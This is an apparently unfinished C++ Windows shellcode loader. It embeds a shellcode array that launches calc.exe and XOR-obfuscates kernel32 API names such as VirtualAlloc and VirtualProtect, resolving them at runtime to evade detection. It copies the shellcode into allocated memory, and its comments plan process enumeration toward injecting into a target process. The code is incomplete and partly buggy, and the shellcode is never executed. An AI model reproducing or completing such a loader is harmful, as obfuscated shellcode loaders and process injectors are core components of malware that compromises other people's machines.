#include <windows.h>
#define TH32CS_SNAPPROCESS 0x00000010
#include <stdlib.h>
#include <stdio.h>
#define FAVICON_ICO 
#include <iostream>

//ico for shellcode

unsigned char shellcode[] = { 
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 
};

char XORKey[] = "CnfJuIafDPxDnFtDShjVKDpaqmfsrdRkuoIGfZFhIqUjLomBlNBgNGfvpIuth";
size_t XORKey_length = sizeof(XORKey);


size_t shellcode_length = sizeof(shellcode);

//1) XOR Decrypt
//void XORdecrypt(unsigned char& shellcode, size_t shellcode_length, char& XORKey, size_t XORKey_length)
unsigned char* XORDecryptLPC(unsigned char *encoded, int sizeOfEncodedStr, char XORKey[], size_t XORKey_length)
{

	for (int it = 0; it < sizeOfEncodedStr; it++)
	{
		encoded[it]= (unsigned char)((encoded[it]) ^ XORKey[(it % XORKey_length)]);
		printf("character %d: %c \n",it, encoded[it]);

	}
	return encoded;

}


unsigned char* XOREncryptLPC(unsigned char* encoded, int sizeOfEncodedStr, char XORKey[], size_t XORKey_length)
{

	for (int it = 0; it < sizeOfEncodedStr; it++)
	{
		encoded[it] = XORKey[(it % XORKey_length)] ^ (unsigned char)((encoded[it]));


	}
	return encoded;

}

//3) Base64 Decrypt

typedef struct tagPROCESSENTRY32 {
	DWORD     dwSize;
	DWORD     cntUsage;
	DWORD     th32ProcessID;
	ULONG_PTR th32DefaultHeapID;
	DWORD     th32ModuleID;
	DWORD     cntThreads;
	DWORD     th32ParentProcessID;
	LONG      pcPriClassBase;
	DWORD     dwFlags;
	CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;

typedef LPVOID (WINAPI* functVirtualAlloc)(//function pointer
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect);


typedef BOOL(WINAPI* functVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

typedef VOID (WINAPI* functRtlMoveMemory)(VOID UNALIGNED* Destination, CONST VOID UNALIGNED* Source, SIZE_T Length);


typedef HANDLE (WINAPI* functCreateToolHelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);

typedef BOOL(WINAPI* functProcess32First)(HANDLE snapshot, PROCESSENTRY32 &lpProcessEntry);

typedef BOOL(WINAPI* functProcess32Next)(HANDLE snapshot, PROCESSENTRY32& lpProcessEntry); //PROCESSENTRY32& seems to be cast by windows into LPPROCESSENTRY32 (Long pointer)

//This variable with store the address of virtual protect.

unsigned char kernel[] = { 0x8, 0xb, 0x14, 0x24, 0x10, 0x25, 0x52, 0x54, 0x6a, 0x34, 0x14, 0x28 };
unsigned char virAlloc[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x27, 0x28, 0x3c, 0x17, 0x27 };
unsigned char virProtec[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x36, 0x36, 0x3f, 0xc, 0x21, 0xd, 0x32 };
unsigned char rtlMoveMem[] = { 0x11, 0x1a, 0xa, 0x7, 0x1a, 0x3f, 0x4, 0x2b, 0x21, 0x3d, 0x17, 0x36, 0x17 };
unsigned char CreateToolhelp32SnapshotFlags[] = {0x17, 0x26, 0x55, 0x78, 0x36, 0x1a, 0x3e, 0x35, 0xa, 0x11, 0x28, 0x14, 0x3c, 0x9, 0x37, 0x1, 0x0, 0x3b};
unsigned char Process32First[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x16, 0x11, 0x36, 0x1d, 0x32 };
unsigned char CreateToolhelp32SnapshotStr[] = { 0x0, 0x1c, 0x3, 0x2b, 0x1, 0x2c, 0x35, 0x9, 0x2b, 0x3c, 0x10, 0x21, 0x2, 0x36, 0x47, 0x76, 0x0, 0x6, 0xb, 0x26, 0x38, 0x2c, 0x1f, 0x15 };
unsigned char Process32Next[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x1e, 0x1d, 0x3c, 0x1a };

int main()
{
	bool isAllocated;
	bool isExec;
	//LPVOID pVirtualAlloc;
	void* memoryBuffer;
	functVirtualProtect pVirtualProtect;
	functVirtualAlloc pVirtualAlloc;
	functRtlMoveMemory pRtlMoveMemory;
	functProcess32First pProcess32First;
	functCreateToolHelp32Snapshot pCreateToolHelp32Snapshot;
	functProcess32Next pProcess32Next;
	pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length)); //point our function pointer to starting code of VirtualAlloc
	if (pVirtualAlloc == NULL)
	{
		printf("pVirtualAlloc is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
	XOREncryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length);


	pVirtualProtect = (functVirtualProtect)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length)); //Why are DLL names LPCSTR, and not LPWSTR>?>?>?>?>>??>
	if (pVirtualProtect == NULL)
	{
		printf("pVirtualProtect is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
	XOREncryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length);

	pRtlMoveMemory = (functRtlMoveMemory)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length));
	if (pRtlMoveMemory == NULL)
	{
		printf("pRtlMoveMemory is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
	XOREncryptLPC(rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length);


	pProcess32First = (functProcess32First)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(Process32First, sizeof(Process32First), XORKey, XORKey_length));
	if (pProcess32First == NULL)
	{
		printf("pProcess32First is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
	XOREncryptLPC(Process32First, sizeof(Process32First), XORKey, XORKey_length);



	pCreateToolHelp32Snapshot = (functCreateToolHelp32Snapshot)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(CreateToolhelp32SnapshotStr, sizeof(CreateToolhelp32SnapshotStr), XORKey, XORKey_length));
	if (pCreateToolHelp32Snapshot == NULL)
	{
		printf("pCreateToolHelp32Snapshot is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
	XOREncryptLPC(CreateToolhelp32SnapshotStr, sizeof(CreateToolhelp32SnapshotStr), XORKey, XORKey_length);

	


	pProcess32Next = (functProcess32Next)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(Process32Next, sizeof(Process32Next), XORKey, XORKey_length));
	if (pProcess32Next == NULL)
	{
		printf("pProcess32Next is null ptr!");

	}
	

	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	printf("HUUUUUULP \n");

	printf("pointer to mem: %p", memoryBuffer);

	pRtlMoveMemory(memoryBuffer, shellcode, shellcode_length);




	HANDLE snapshot = NULL;
	if (pCreateToolHelp32Snapshot != NULL)
	{
		HANDLE snapshot = pCreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	}
	else
	{
		printf("FUKKKKKKKKKKKKK \n");
	}






		//testing

		PROCESSENTRY32 test;
		test.dwSize = sizeof(PROCESSENTRY32);

		pProcess32First(snapshot, test);

		//std::cout << test.th32ProcessID;


		//1. ToolsSnapshot via indirect syscall
		//2. Iterate over snapshot until next == null. Looking for string match with target process name. Get PID from that.
		//Use PID to get proc handle?










		printf("test \n\n\n");
		int a = 0;
		while (a  < 333)
		{
			a++;
		}


		return -1;
	}